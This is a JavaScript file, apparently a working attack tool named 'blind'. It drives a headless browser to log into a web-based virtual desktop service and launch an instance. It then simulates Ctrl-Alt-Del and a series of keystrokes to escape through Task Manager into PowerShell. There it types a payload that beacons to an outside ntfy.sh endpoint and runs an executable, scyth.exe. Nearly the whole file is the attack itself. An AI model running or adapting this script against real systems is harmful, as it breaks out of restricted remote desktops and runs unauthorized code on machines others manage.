import arg from "arg";

const args = arg({
    "--help": Boolean,
    "--debug": Boolean,
    "--no-headless": Boolean,
    "--short": Boolean,
    "--time": Number,
});

if(args["--help"]) {
    console.log(" -- blind, a headless injector -- ");
    process.exit(0);
}

const d = args["--debug"];

import dotenv from "dotenv";
dotenv.config({ path: "./.env" });

import puppeteer from "puppeteer";
import { readFileSync } from "fs";

const a2q = JSON.parse(readFileSync("./kb.json"))
const q2a = Object.fromEntries(Object.entries(a2q).map(a => a.reverse()))

function log(str) {
    if(!str.startsWith("[*]") || d) {
        console.log(str)
    }
}

async function _wait(r) {
    await new Promise(p => setTimeout(p, r))
}

async function type(keyboard, str, to) {
    for (const i in str) {
	const key = str[i].toLowerCase();
	const k = a2q[key] || key;

	let shift = false;

	if(str[i].match(/[A-Z]/)) {
	    shift = true;

	    await keyboard.down("Shift")
	    await _wait(150);
	}

	switch(key) {
	    case ".":
		await keyboard.down("Shift");
		await _wait(150);

		await keyboard.press(",");
		await _wait(150);

		await keyboard.up("Shift");
		await _wait(150);
		break;

	case ":":
		await keyboard.press(".");
		await _wait(150);
		break;
	
	    default:
		await keyboard.press(k);
	}

	if(shift) {
	    await keyboard.up("Shift")
	    await _wait(150);
	}

	await _wait(to);
    }

    await keyboard.press("Enter") 
}

const payload = ['Invoke-WebRequest -URI ntfy.sh/aarys-main-test -method post -Body "feur"', "H:", "./scyth.exe"]

async function main() {
    log("[*] starting blind")

    log("[*] Opening " + process.env.URL);
    
    if(args["--no-headless"]){
	log("[*] Opening chrome")
    } else {
	log("[!] headless")
    }

    const browser = await puppeteer.launch({headless: !args["--no-headless"]});
    const page = await browser.newPage();

    await page.goto(process.env.URL);

    log("[*] Attempting to login")

    const loginButtonSelector = '#loginButton';
    await page.waitForSelector(loginButtonSelector);

    await page.type('#username', process.env.UNAME);
    await page.type("#password", process.env.PASSWORD);
    await page.click(loginButtonSelector);

    const instanceSelector = ".ui-desktop-list";
    await page.waitForSelector(instanceSelector);

    log("[*] Launching instance ...")
   
    
    await page.evaluate((sel) => {
        let i = Array.from(document.querySelector(sel).children).filter(child => child.id.includes("3d"))[0];

        Array.from(i.children)[0].click();
    }, instanceSelector);

    await page.waitForSelector(".desktopBackground");

    const timer = args["--time"] || (args["--short"] ? 15000:45000)
    log("[*] Starting timer: " + timer.toString())

    await _wait(timer);

    log("[*] Attempting to close the fullscreen dialog")

    try {
	await page.evaluate((btn) => {
		document.getElementById(btn).click()
	}, "cancelDialogBtn")
    } catch {
	log(" \\--- FAILED! ")
    }

    /* --- PAYLOAD PHASE --- */
    log("[+] Starting payload phase")


    const cadSelector = 'cad';

    await page.evaluate((sel) => {
        document.getElementById(sel).click();
        }, cadSelector);

    log("[*] CAD sent")

    await page.mouse.click(250, 250);

    await _wait(1000);
    await page.keyboard.press("Tab");
    await _wait(500);
    await page.keyboard.press("Tab");
    await _wait(500);
    await page.keyboard.press("Enter");

    log("[*] -> Shound have opened taskmgr.exe")

    await _wait(1000);
    await page.keyboard.press("Tab");
    await _wait(500);
    await page.keyboard.press("Space");

    log("[*] -> Should have expanded taskmgr.exe")

    await _wait(500);
    await page.keyboard.press("Alt");
    await _wait(500);
    await page.keyboard.press("f");
    await _wait(500);
    await page.keyboard.press("Enter");

    log("[*] -> Should have the run dialog")

    await _wait(500);
    await type(page.keyboard, "powershell", 100);

    log("[+] Waiting for powershell.exe to open")

    await _wait(5000);

    for (const i in payload) {
	const phase = payload[i];
	log(" +- type: " + phase);

	await type(page.keyboard, phase, 100);
	await _wait(1500);
    }
}

(async () => 
    await main()
)()
